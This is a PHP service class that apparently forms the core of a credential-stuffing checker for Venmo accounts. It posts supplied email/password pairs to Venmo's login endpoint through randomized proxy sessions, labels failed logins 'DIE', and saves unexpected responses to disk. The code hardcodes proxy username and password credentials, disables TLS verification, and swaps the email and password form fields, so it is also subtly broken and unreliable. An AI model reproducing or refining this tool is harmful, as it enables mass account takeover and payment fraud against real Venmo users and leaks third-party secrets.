<?php

namespace App\Service;

use App\Enums\VenmoStatus;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\RequestOptions;
use Psr\Http\Message\ResponseInterface;

class Venmo
{
    protected Client $client;
    protected CookieJar $cookieJar;

    public function __construct(
        protected string $email,
        protected string $password
    ) {
        $proxySession   =   \Illuminate\Support\Str::random(16);
        $proxyCountry   =   'UnitedStates';
        $proxyAuth      =   'lilmama666:ryBTtIt95DXZkfau_country-' . $proxyCountry . '_session-' . $proxySession;
        $proxyServer    =   '52.0.60.68:31112';

        $this->cookieJar = new CookieJar();
        $this->client = new Client([
            RequestOptions::HTTP_ERRORS => false,
            RequestOptions::VERIFY => false,
            RequestOptions::COOKIES   => $this->cookieJar,
            RequestOptions::PROXY => 'http://' . $proxyAuth . '@' . $proxyServer
        ]);
    }

    public function handle()
    {
        $loginPage = $this->client->get('https://venmo.com/account/sign-in');

        if ($loginPage->getStatusCode() != 200) {
            return $this->response(VenmoStatus::ERROR, 'Http ' . $loginPage->getStatusCode());
        }

        //
        $loginRequest = $this->client->post('https://venmo.com/login', [
            'form_params'   => [
                'return_json' => true,
                'password' => $this->email,
                'phoneEmailUsername' => $this->password,
            ],
            'headers'   => [
                'Content-Type'  =>  'application/x-www-form-urlencoded',
                'Accept'        =>  'application/json',
                'User-Agent'    =>  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
            ]
        ]);

        $loginResponse = json_decode($loginRequest->getBody()->getContents());

        if (!$loginResponse) {
            return $this->response(VenmoStatus::ERROR, 'Cannot parse the response');
        }

        $loginResponse = optional($loginResponse);

        if ($loginResponse->error) {
            $status = match ($loginResponse->error->code) {
                264     => VenmoStatus::DIE,
                default => VenmoStatus::ERROR
            };

            return $this->response($status, $loginResponse->error->message);
        }

        return $this->response(VenmoStatus::UNKNOWN, 'Unknown error', $loginResponse);
    }

    public function response(VenmoStatus $status, string $message, ?ResponseInterface $response = null)
    {
        if ($status === VenmoStatus::UNKNOWN && $response) {
            $this->writeUnknownResponse($status, $response);
        }

        return (object) [
            'status'    => $status->value,
            'message'   => $message,
            'data'      => [
                'email' => $this->email,
                'password' => $this->password,
            ]
        ];
    }

    public function writeUnknownResponse(VenmoStatus $status, ResponseInterface $response)
    {
        if ($status === VenmoStatus::UNKNOWN) {
            $unknownResponsePath = getcwd() . '/result/unknown/http_' . $response->getStatusCode();

            if (!is_dir($unknownResponsePath)) {
                @mkdir($unknownResponsePath, 0777, true);
            }

            $htmlResponse = (string) $response->getBody()->getContents();
            $responseJson = optional(json_encode($response));

            @file_put_contents($unknownResponsePath . '/' . str($this->email)->slug('_') . '.html', <<<KONTOL
                <div>
                    $responseJson
                </div>
                $htmlResponse
            KONTOL);
        }
    }
}
